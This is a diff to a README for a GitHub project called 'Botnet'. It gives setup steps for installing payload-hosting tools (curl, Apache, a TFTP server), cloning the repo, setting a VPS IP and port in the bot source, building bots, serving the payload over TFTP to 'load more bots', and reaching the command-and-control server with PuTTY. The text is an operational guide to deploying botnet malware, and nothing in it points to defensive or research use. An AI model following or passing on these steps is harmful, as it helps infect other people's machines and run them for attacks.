@@ -4,7 +4,7 @@
 - `apt-get install gcc-core -y` (Required at all)
 - `apt-get install curl -y` (Needed for payload)
 - `apt-get install apache2 -y` (Needed for payload)
-- `apt-get install tftpd-hpa -y` (Needed for tftp payload)
+- `apt-get install tftpd-hpa -y` (Optional if you need tftp payload)
 
 # Steps:
 - git clone https://github.com/NoSpacesFlies/Botnet/
@@ -15,7 +15,7 @@
 # Bot steps
 - Edit main.c in /bot directory to your bot port and vps ip
 - sh legacybotbuilder.sh
-- sh tftpserver.sh  # start tftp server
+- sh tftpserver.sh  (Optional step but may help load more bots with bigger payload)
 
 # Connecting
 - Putty raw using vps ip + cnc port
